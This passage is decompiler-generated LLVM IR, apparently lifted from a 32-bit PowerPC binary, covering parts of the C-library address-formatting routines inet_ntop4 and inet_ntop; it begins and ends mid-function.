  %v3_1001d9a0 = icmp eq i32 %v0_1001d9a0, 0
  %v1_1001d9e4.pre = load i32, i32* @r27, align 4
  %v4_1001d9e4 = icmp eq i32 %v0_1001d9e4.pre, %v1_1001d9e4.pre
  br i1 %v3_1001d9a0, label %dec_label_pc_1001d9e4, label %dec_label_pc_1001d9a8

dec_label_pc_1001d9a8:                            ; preds = %dec_label_pc_1001d9a0
  %v2_1001d9ac = sub i32 %v0_1001d9e4.pre, %v0_1001d9a0
  store i32 %v2_1001d9ac, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br i1 %v4_1001d9e4, label %dec_label_pc_1001da18, label %dec_label_pc_1001d9cc.preheader

dec_label_pc_1001d9cc.preheader:                  ; preds = %dec_label_pc_1001d9a8
  %v3_1001d9cc23 = icmp slt i32 %v2_1001d9ac, 1
  %v2_1001d9d025 = add i32 %v2_1001d9ac, -1
  store i32 %v2_1001d9d025, i32* @r10, align 4
  %v2_1001d9d426 = add i32 %v1_1001d9e4.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_1001d9cc23, label %dec_label_pc_1001d9e4.thread, label %dec_label_pc_1001d9c0

dec_label_pc_1001d9c0:                            ; preds = %dec_label_pc_1001d9cc.preheader, %dec_label_pc_1001d9c0.dec_label_pc_1001d9c0_crit_edge
  %v0_1001d9c0 = phi i32 [ %v0_1001d9c0.pre, %dec_label_pc_1001d9c0.dec_label_pc_1001d9c0_crit_edge ], [ %v0_1001d9a0, %dec_label_pc_1001d9cc.preheader ]
  %v2_1001d9d428 = phi i32 [ %v2_1001d9d4, %dec_label_pc_1001d9c0.dec_label_pc_1001d9c0_crit_edge ], [ %v2_1001d9d426, %dec_label_pc_1001d9cc.preheader ]
  %v2_1001d9d027 = phi i32 [ %v2_1001d9d0, %dec_label_pc_1001d9c0.dec_label_pc_1001d9c0_crit_edge ], [ %v2_1001d9d025, %dec_label_pc_1001d9cc.preheader ]
  %v2_1001d9c0 = add i32 %v0_1001d9c0, %v2_1001d9d027
  %v3_1001d9c0 = inttoptr i32 %v2_1001d9c0 to i8*
  %v4_1001d9c0 = load i8, i8* %v3_1001d9c0, align 1
  %v5_1001d9c0 = zext i8 %v4_1001d9c0 to i32
  store i32 %v5_1001d9c0, i32* %r0.global-to-local, align 4
  %v3_1001d9c4 = inttoptr i32 %v2_1001d9d428 to i8*
  store i8 %v4_1001d9c0, i8* %v3_1001d9c4, align 1
  %v0_1001d9c8 = load i32, i32* @r8, align 4
  %v1_1001d9c8 = load i32, i32* @r24, align 4
  %v2_1001d9c8 = load i32, i32* @r10, align 4
  %v3_1001d9c8 = trunc i32 %v0_1001d9c8 to i8
  %v4_1001d9c8 = add i32 %v2_1001d9c8, %v1_1001d9c8
  %v5_1001d9c8 = inttoptr i32 %v4_1001d9c8 to i8*
  store i8 %v3_1001d9c8, i8* %v5_1001d9c8, align 1
  %v0_1001d9cc.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1001d9cc.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1001d9d4.pre = load i32, i32* @r27, align 4
  %v3_1001d9cc = icmp slt i32 %v1_1001d9cc.pre, %v0_1001d9cc.pre
  %v2_1001d9d0 = sub i32 %v1_1001d9cc.pre, %v0_1001d9cc.pre
  store i32 %v2_1001d9d0, i32* @r10, align 4
  %v1_1001d9d8 = add i32 %v0_1001d9cc.pre, 1
  store i32 %v1_1001d9d8, i32* %r9.global-to-local, align 4
  br i1 %v3_1001d9cc, label %dec_label_pc_1001d9e4.thread, label %dec_label_pc_1001d9c0.dec_label_pc_1001d9c0_crit_edge

dec_label_pc_1001d9c0.dec_label_pc_1001d9c0_crit_edge: ; preds = %dec_label_pc_1001d9c0
  %v2_1001d9d4 = sub i32 %v1_1001d9d4.pre, %v0_1001d9cc.pre
  %v0_1001d9c0.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_1001d9c0

dec_label_pc_1001d9e4.thread:                     ; preds = %dec_label_pc_1001d9c0, %dec_label_pc_1001d9cc.preheader
  %v0_1001d9e0.lcssa = phi i32 [ %v1_1001d9e4.pre, %dec_label_pc_1001d9cc.preheader ], [ %v1_1001d9d4.pre, %dec_label_pc_1001d9c0 ]
  store i32 %v0_1001d9e0.lcssa, i32* @r31, align 4
  br label %dec_label_pc_1001d9ec

dec_label_pc_1001d9e4:                            ; preds = %dec_label_pc_1001d9a0
  br i1 %v4_1001d9e4, label %dec_label_pc_1001d9ec, label %dec_label_pc_1001da18

dec_label_pc_1001d9ec:                            ; preds = %dec_label_pc_1001d9e4.thread, %dec_label_pc_1001d9e4
  %v0_1001d9ec = load i32, i32* @r22, align 4
  store i32 %v0_1001d9ec, i32* @r3, align 4
  store i32 %v2_1001d868, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001d9fc.1198 to i32), i32* @lr, align 4
  %v0_1001d9f8 = call i32 @memcpy()
  store i32 %v0_1001d9f8, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001da1c

dec_label_pc_1001da04:                            ; preds = %dec_label_pc_1001d848
  %v0_1001da04 = call i32 @__errno_location()
  store i32 %v0_1001da04, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1001da10 = inttoptr i32 %v0_1001da04 to i32*
  store i32 97, i32* %v2_1001da10, align 4
  %v0_1001da20.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001da1c

dec_label_pc_1001da18:                            ; preds = %dec_label_pc_1001d90c, %dec_label_pc_1001d900, %dec_label_pc_1001d8c4, %dec_label_pc_1001d8ec, %dec_label_pc_1001d9a8, %dec_label_pc_1001d94c, %dec_label_pc_1001d938, %dec_label_pc_1001d9e4, %dec_label_pc_1001d88c, %dec_label_pc_1001d984, %dec_label_pc_1001d940
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001da1c

dec_label_pc_1001da1c:                            ; preds = %dec_label_pc_1001da04, %dec_label_pc_1001d9ec, %dec_label_pc_1001d854, %dec_label_pc_1001da18
  %v0_1001da20 = phi i32 [ %v0_1001da20.pre, %dec_label_pc_1001da04 ], [ 1, %dec_label_pc_1001d9ec ], [ %v2_1001d85c, %dec_label_pc_1001d854 ], [ 0, %dec_label_pc_1001da18 ]
  store i32 %v0_1001d82c, i32* %r0.global-to-local, align 4
  store i32 %v0_1001da20, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001da20

; uselistorder directives
  uselistorder i32 %v0_1001da20, { 1, 0 }
  uselistorder i32 %v2_1001d9d0, { 1, 0 }
  uselistorder i32 %v0_1001d9cc.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_1001d9e4, { 1, 0 }
  uselistorder i32 %v0_1001d9e4.pre, { 1, 0 }
  uselistorder i32 %v0_1001d990, { 1, 0 }
  uselistorder i32 %v0_1001d9e4.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1001d970, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1001d918, { 1, 0 }
  uselistorder i32 %v1_1001d8c8, { 1, 0 }
  uselistorder i32 %v0_1001d838, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 17, 7, 8, 11, 12, 9, 10, 4, 1, 16, 3, 2, 15, 14, 13, 0 }
  uselistorder i32 (i32)* @__GI_tolower, { 2, 1, 0 }
  uselistorder i32 268556660, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_1001da1c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001da18, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_1001d9ec, { 1, 0 }
  uselistorder label %dec_label_pc_1001d9c0, { 1, 0 }
  uselistorder label %dec_label_pc_1001d9a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001d97c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001d8a4.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1001d8a4, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1001da8c.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_1001da34 = load i32, i32* @lr, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 15, i32* @r5, align 4
  %v2_1001da60 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_1001da60, i32* @r3, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_1001da70.1201 to i32), i32* @lr, align 4
  %v0_1001da6c = call i32 @__GI_memset()
  store i32 %v0_1001da6c, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_1001db302 = load i32, i32* @r1, align 4
  store i32 %v0_1001db302, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001da8c

dec_label_pc_1001da8c:                            ; preds = %dec_label_pc_1001db00.dec_label_pc_1001da8c_crit_edge, %dec_label_pc_1001da8c.lr.ph
  %v2_1001daac = phi i32 [ %v2_1001db30, %dec_label_pc_1001db00.dec_label_pc_1001da8c_crit_edge ], [ %v0_1001db302, %dec_label_pc_1001da8c.lr.ph ]
  %v0_1001daa0 = phi i32 [ %v0_1001db30, %dec_label_pc_1001db00.dec_label_pc_1001da8c_crit_edge ], [ %v0_1001db302, %dec_label_pc_1001da8c.lr.ph ]
  %v0_1001da90 = phi i32 [ %v1_1001db30, %dec_label_pc_1001db00.dec_label_pc_1001da8c_crit_edge ], [ 0, %dec_label_pc_1001da8c.lr.ph ]
  %v1_1001da98 = phi i32 [ %v1_1001da8c.pre, %dec_label_pc_1001db00.dec_label_pc_1001da8c_crit_edge ], [ 0, %dec_label_pc_1001da8c.lr.ph ]
  %v0_1001da8c = load i32, i32* %r31.global-to-local, align 4
  %v2_1001da8c = add i32 %v0_1001da8c, %v1_1001da98
  %v3_1001da8c = inttoptr i32 %v2_1001da8c to i8*
  %v4_1001da8c = load i8, i8* %v3_1001da8c, align 1
  %v5_1001da8c = zext i8 %v4_1001da8c to i32
  store i32 %v5_1001da8c, i32* %r10.global-to-local, align 4
  store i32 %v0_1001da90, i32* %r8.global-to-local, align 4
  %v1_1001da94 = add i32 %v0_1001da90, 1
  store i32 %v1_1001da94, i32* %r11.global-to-local, align 4
  store i32 %v2_1001da8c, i32* %r3.global-to-local, align 4
  %v1_1001da9c = load i32, i32* @r28, align 4
  %v2_1001da9c = udiv i32 %v5_1001da8c, %v1_1001da9c
  %v2_1001daa0 = add i32 %v1_1001da94, %v0_1001daa0
  store i32 %v2_1001daa0, i32* %r6.global-to-local, align 4
  %v1_1001daa4 = add nuw nsw i32 %v2_1001da9c, 48
  %v1_1001daa8 = urem i32 %v1_1001daa4, 256
  store i32 %v1_1001daa8, i32* %r0.global-to-local, align 4
  %v1_1001daac = trunc i32 %v1_1001daa4 to i8
  %v3_1001daac = add i32 %v2_1001daac, 8
  %v4_1001daac = inttoptr i32 %v3_1001daac to i8*
  store i8 %v1_1001daac, i8* %v4_1001daac, align 1
  %v0_1001dab0 = load i32, i32* %r0.global-to-local, align 4
  %v3_1001dab0 = icmp eq i32 %v0_1001dab0, 48
  %v0_1001dab8 = load i32, i32* %r10.global-to-local, align 4
  %v1_1001dab8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1001dab8 = udiv i32 %v0_1001dab8, %v1_1001dab8
  store i32 %v2_1001dab8, i32* %r9.global-to-local, align 4
  br i1 %v3_1001dab0, label %dec_label_pc_1001dab8, label %dec_label_pc_1001dae4

dec_label_pc_1001dab8:                            ; preds = %dec_label_pc_1001da8c
  %v2_1001dabc = udiv i32 %v2_1001dab8, %v1_1001dab8
  %tmp18 = mul i32 %v2_1001dabc, -10
  %v2_1001dac4 = add i32 %v2_1001dab8, 48
  %v1_1001dac8 = add i32 %v2_1001dac4, %tmp18
  store i32 %v1_1001dac8, i32* %r9.global-to-local, align 4
  %v1_1001dacc = urem i32 %v1_1001dac8, 256
  store i32 %v1_1001dacc, i32* %r0.global-to-local, align 4
  %v1_1001dad0 = trunc i32 %v1_1001dac8 to i8
  %v2_1001dad0 = load i32, i32* %r7.global-to-local, align 4
  %v3_1001dad0 = add i32 %v2_1001dad0, 8
  %v4_1001dad0 = inttoptr i32 %v3_1001dad0 to i8*
  store i8 %v1_1001dad0, i8* %v4_1001dad0, align 1
  %v0_1001dad4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1001dad4 = icmp eq i32 %v0_1001dad4, 48
  br i1 %v3_1001dad4, label %dec_label_pc_1001db00, label %dec_label_pc_1001dadc

dec_label_pc_1001dadc:                            ; preds = %dec_label_pc_1001dab8
  %v0_1001dadc = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1001dadc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1001db00

dec_label_pc_1001dae4:                            ; preds = %dec_label_pc_1001da8c
  %v0_1001dae8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001dae8 = add i32 %v0_1001dae8, 1
  store i32 %v1_1001dae8, i32* %r8.global-to-local, align 4
  %v2_1001daec = udiv i32 %v2_1001dab8, %v1_1001dab8
  %v1_1001daf0 = mul i32 %v2_1001daec, 10
  store i32 %v1_1001daf0, i32* %r0.global-to-local, align 4
  %v2_1001daf4 = sub i32 %v2_1001dab8, %v1_1001daf0
  %v1_1001daf8 = add i32 %v2_1001daf4, 48
  store i32 %v1_1001daf8, i32* %r9.global-to-local, align 4
  %v1_1001dafc = trunc i32 %v1_1001daf8 to i8
  %v2_1001dafc = load i32, i32* %r6.global-to-local, align 4
  %v3_1001dafc = add i32 %v2_1001dafc, 8
  %v4_1001dafc = inttoptr i32 %v3_1001dafc to i8*
  store i8 %v1_1001dafc, i8* %v4_1001dafc, align 1
  br label %dec_label_pc_1001db00

dec_label_pc_1001db00:                            ; preds = %dec_label_pc_1001dab8, %dec_label_pc_1001dadc, %dec_label_pc_1001dae4
  %v0_1001db00 = load i32, i32* %r3.global-to-local, align 4
  %v1_1001db00 = inttoptr i32 %v0_1001db00 to i8*
  %v2_1001db00 = load i8, i8* %v1_1001db00, align 1
  %v3_1001db00 = zext i8 %v2_1001db00 to i32
  %v0_1001db04 = load i32, i32* %r8.global-to-local, align 4
  %v1_1001db04 = add i32 %v0_1001db04, 1
  %v0_1001db08 = load i32, i32* @r1, align 4
  %v2_1001db08 = add i32 %v0_1001db08, %v0_1001db04
  store i32 %v2_1001db08, i32* %r10.global-to-local, align 4
  %v2_1001db0c = add i32 %v1_1001db04, %v0_1001db08
  store i32 %v2_1001db0c, i32* @r8, align 4
  %v1_1001db10 = load i32, i32* %r5.global-to-local, align 4
  %v2_1001db10 = udiv i32 %v3_1001db00, %v1_1001db10
  %v1_1001db14 = add i32 %v0_1001db04, 2
  store i32 %v1_1001db14, i32* %r11.global-to-local, align 4
  %v0_1001db18 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001db18 = add i32 %v0_1001db18, 1
  store i32 %v1_1001db18, i32* %r4.global-to-local, align 4
  %v1_1001db1c = mul nuw nsw i32 %v2_1001db10, 10
  store i32 %v1_1001db1c, i32* %r0.global-to-local, align 4
  %v2_1001db20 = sub nsw i32 %v3_1001db00, %v1_1001db1c
  %v1_1001db24 = add nsw i32 %v2_1001db20, 48
  store i32 %v1_1001db24, i32* %r9.global-to-local, align 4
  %v1_1001db28 = trunc i32 %v1_1001db24 to i8
  %v3_1001db28 = add i32 %v2_1001db08, 8
  %v4_1001db28 = inttoptr i32 %v3_1001db28 to i8*
  store i8 %v1_1001db28, i8* %v4_1001db28, align 1
  %v0_1001db2c = load i32, i32* %r12.global-to-local, align 4
  %v1_1001db2c = trunc i32 %v0_1001db2c to i8
  %v2_1001db2c = load i32, i32* @r8, align 4
  %v3_1001db2c = add i32 %v2_1001db2c, 8
  %v4_1001db2c = inttoptr i32 %v3_1001db2c to i8*
  store i8 %v1_1001db2c, i8* %v4_1001db2c, align 1
  %v0_1001db30 = load i32, i32* @r1, align 4
  %v1_1001db30 = load i32, i32* %r11.global-to-local, align 4
  %v2_1001db30 = add i32 %v1_1001db30, %v0_1001db30
  store i32 %v2_1001db30, i32* %r7.global-to-local, align 4
  %v0_1001db34 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001db34 = add i32 %v0_1001db34, -1
  store i32 %v1_1001db34, i32* %ctr.global-to-local, align 4
  %v2_1001db34 = icmp eq i32 %v1_1001db34, 0
  br i1 %v2_1001db34, label %dec_label_pc_1001db38, label %dec_label_pc_1001db00.dec_label_pc_1001da8c_crit_edge

dec_label_pc_1001db00.dec_label_pc_1001da8c_crit_edge: ; preds = %dec_label_pc_1001db00
  %v1_1001da8c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1001da8c

dec_label_pc_1001db38:                            ; preds = %dec_label_pc_1001db00
  %v2_1001db38 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_1001db38, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1001db40 = add i32 %v1_1001db30, %v2_1001db38
  store i32 %v2_1001db40, i32* %r9.global-to-local, align 4
  store i32 %v2_1001db38, i32* @r3, align 4
  %v3_1001db48 = add i32 %v2_1001db40, -1
  %v4_1001db48 = inttoptr i32 %v3_1001db48 to i8*
  store i8 0, i8* %v4_1001db48, align 1
  %v0_1001db4c = call i32 @__GI_strlen()
  store i32 %v0_1001db4c, i32* %r3.global-to-local, align 4
  %v1_1001db50 = load i32, i32* @r30, align 4
  %v3_1001db50 = icmp ugt i32 %v0_1001db4c, %v1_1001db50
  br i1 %v3_1001db50, label %dec_label_pc_1001db58, label %dec_label_pc_1001db6c

dec_label_pc_1001db58:                            ; preds = %dec_label_pc_1001db38
  %v0_1001db58 = call i32 @__errno_location()
  store i32 %v0_1001db58, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1001db64 = inttoptr i32 %v0_1001db58 to i32*
  store i32 28, i32* %v2_1001db64, align 4
  %v0_1001db80.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001db7c

dec_label_pc_1001db6c:                            ; preds = %dec_label_pc_1001db38
  %v0_1001db6c = load i32, i32* @r29, align 4
  store i32 %v0_1001db6c, i32* %r3.global-to-local, align 4
  store i32 %v2_1001db38, i32* %r4.global-to-local, align 4
  %v2_1001db74 = bitcast i16* %stack_var_-56 to i8*
  %v3_1001db74 = call i32 @strcpy(i32 %v0_1001db6c, i8* %v2_1001db74)
  store i32 %v3_1001db74, i32* %r3.global-to-local, align 4
  store i32 %v3_1001db74, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001db7c

dec_label_pc_1001db7c:                            ; preds = %dec_label_pc_1001db58, %dec_label_pc_1001db6c
  %v0_1001db80 = phi i32 [ %v0_1001db80.pre, %dec_label_pc_1001db58 ], [ %v3_1001db74, %dec_label_pc_1001db6c ]
  store i32 %v0_1001da34, i32* %r0.global-to-local, align 4
  store i32 %v0_1001db80, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001db80

; uselistorder directives
  uselistorder i32 %v0_1001db80, { 1, 0 }
  uselistorder i32 %v2_1001db38, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1001db34, { 1, 0 }
  uselistorder i32 %v2_1001db30, { 1, 0 }
  uselistorder i32 %v0_1001db04, { 1, 0, 2 }
  uselistorder i32 %v1_1001dac8, { 1, 0, 2 }
  uselistorder i32 %v2_1001dab8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1001daa4, { 1, 0 }
  uselistorder i32 %v0_1001da90, { 1, 0 }
  uselistorder i32 %v0_1001db302, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001db7c, { 1, 0 }
  uselistorder label %dec_label_pc_1001db00, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_1001db94 = icmp slt i32 %arg1, 2
  %v3_1001db94 = icmp eq i32 %arg1, 2
  store i1 %v1_1001db94, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001db94, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_1001db94, label %dec_label_pc_1001dbc4, label %dec_label_pc_1001dbb8

dec_label_pc_1001dbb8:                            ; preds = %entry
  %v1_1001dbb8 = icmp slt i32 %arg1, 10
  %v3_1001dbb8 = icmp eq i32 %arg1, 10
  store i1 %v1_1001dbb8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dbb8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dbb8, label %dec_label_pc_1001dbfc.lr.ph, label %dec_label_pc_1001de10

dec_label_pc_1001dbc4:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1001dbd4.1203 to i32), i32* @lr, align 4
  %v3_1001dbd0 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1001de08

dec_label_pc_1001dbfc.lr.ph:                      ; preds = %dec_label_pc_1001dbb8
  %v2_1001dbd8 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1001dbd8, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v2_1001dbd8, i32* @r3, align 4
  store i32 32, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1001dbec.1204 to i32), i32* @lr, align 4
  %v0_1001dbe8 = call i32 @__GI_memset()
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1001dc1c15 = load i32, i32* @r27, align 4
  store i32 %v0_1001dc1c15, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001dbfc

dec_label_pc_1001dbfc:                            ; preds = %dec_label_pc_1001dbfc.lr.ph, %dec_label_pc_1001dbfc
  %v1_1001dc10 = phi i32 [ 0, %dec_label_pc_1001dbfc.lr.ph ], [ %v1_1001dc20, %dec_label_pc_1001dbfc ]
  %v0_1001dbfc = phi i32 [ %v0_1001dc1c15, %dec_label_pc_1001dbfc.lr.ph ], [ %v0_1001dc1c, %dec_label_pc_1001dbfc ]
  %v0_1001dc04 = phi i32 [ %v0_1001dc1c15, %dec_label_pc_1001dbfc.lr.ph ], [ %v2_1001dc1c, %dec_label_pc_1001dbfc ]
  %v1_1001dbfc = phi i32 [ 0, %dec_label_pc_1001dbfc.lr.ph ], [ %v0_1001dc14, %dec_label_pc_1001dbfc ]
  %v2_1001dbfc = add i32 %v0_1001dbfc, %v1_1001dbfc
  %v3_1001dbfc = inttoptr i32 %v2_1001dbfc to i8*
  %v4_1001dbfc = load i8, i8* %v3_1001dbfc, align 1
  %v5_1001dbfc = zext i8 %v4_1001dbfc to i32
  %v1_1001dc00 = add i32 %v1_1001dbfc, 2
  store i32 %v1_1001dc00, i32* %r11.global-to-local, align 4
  %v1_1001dc04 = add i32 %v0_1001dc04, 1
  %v2_1001dc04 = inttoptr i32 %v1_1001dc04 to i8*
  %v3_1001dc04 = load i8, i8* %v2_1001dc04, align 1
  %v4_1001dc04 = zext i8 %v3_1001dc04 to i32
  %v1_1001dc08 = mul nuw nsw i32 %v5_1001dbfc, 256
  %v2_1001dc0c = or i32 %v4_1001dc04, %v1_1001dc08
  %v2_1001dc10 = load i32, i32* %r29.global-to-local, align 4
  %v3_1001dc10 = add i32 %v2_1001dc10, %v1_1001dc10
  %v4_1001dc10 = inttoptr i32 %v3_1001dc10 to i32*
  store i32 %v2_1001dc0c, i32* %v4_1001dc10, align 4
  %v0_1001dc14 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001dc14 = udiv i32 %v0_1001dc14, 2
  %v0_1001dc1c = load i32, i32* @r27, align 4
  %v2_1001dc1c = add i32 %v0_1001dc1c, %v0_1001dc14
  store i32 %v2_1001dc1c, i32* %r9.global-to-local, align 4
  %v1_1001dc20 = mul i32 %v1_1001dc14, 4
  %v0_1001dc24 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001dc24 = add i32 %v0_1001dc24, -1
  store i32 %v1_1001dc24, i32* %ctr.global-to-local, align 4
  %v2_1001dc24 = icmp eq i32 %v1_1001dc24, 0
  br i1 %v2_1001dc24, label %dec_label_pc_1001dc44.lr.ph, label %dec_label_pc_1001dbfc

dec_label_pc_1001dc44.lr.ph:                      ; preds = %dec_label_pc_1001dbfc
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001dc44

dec_label_pc_1001dc44:                            ; preds = %dec_label_pc_1001dc44.lr.ph, %dec_label_pc_1001dc90
  %v0_1001dc94 = phi i32 [ 8, %dec_label_pc_1001dc44.lr.ph ], [ %v1_1001dc94, %dec_label_pc_1001dc90 ]
  %v0_1001dc84 = phi i32 [ -1, %dec_label_pc_1001dc44.lr.ph ], [ %v0_1001dc8442, %dec_label_pc_1001dc90 ]
  %v0_1001dc74 = phi i32 [ -1, %dec_label_pc_1001dc44.lr.ph ], [ %v0_1001dc7439, %dec_label_pc_1001dc90 ]
  %v0_1001dc48 = phi i32 [ -1, %dec_label_pc_1001dc44.lr.ph ], [ %v0_1001dc4835, %dec_label_pc_1001dc90 ]
  %v0_1001dc90 = phi i32 [ 0, %dec_label_pc_1001dc44.lr.ph ], [ %v1_1001dc90, %dec_label_pc_1001dc90 ]
  %v1_1001dc44 = mul i32 %v0_1001dc90, 4
  %v3_1001dc48 = icmp eq i32 %v0_1001dc48, -1
  %v2_1001dc4c = add i32 %v1_1001dc44, %v2_1001dbd8
  %v3_1001dc4c = inttoptr i32 %v2_1001dc4c to i32*
  %v4_1001dc4c = load i32, i32* %v3_1001dc4c, align 4
  %v3_1001dc50 = icmp eq i32 %v4_1001dc4c, 0
  br i1 %v3_1001dc50, label %dec_label_pc_1001dc58, label %dec_label_pc_1001dc70

dec_label_pc_1001dc58:                            ; preds = %dec_label_pc_1001dc44
  br i1 %v3_1001dc48, label %dec_label_pc_1001dc5c, label %dec_label_pc_1001dc68

dec_label_pc_1001dc5c:                            ; preds = %dec_label_pc_1001dc58
  store i32 %v0_1001dc90, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_1001dc90

dec_label_pc_1001dc68:                            ; preds = %dec_label_pc_1001dc58
  %v0_1001dc68 = load i32, i32* @r31, align 4
  %v1_1001dc68 = add i32 %v0_1001dc68, 1
  store i32 %v1_1001dc68, i32* @r31, align 4
  br label %dec_label_pc_1001dc90

dec_label_pc_1001dc70:                            ; preds = %dec_label_pc_1001dc44
  br i1 %v3_1001dc48, label %dec_label_pc_1001dc90, label %dec_label_pc_1001dc74

dec_label_pc_1001dc74:                            ; preds = %dec_label_pc_1001dc70
  %v3_1001dc74 = icmp eq i32 %v0_1001dc74, -1
  %v0_1001dc88.pre = load i32, i32* @r31, align 4
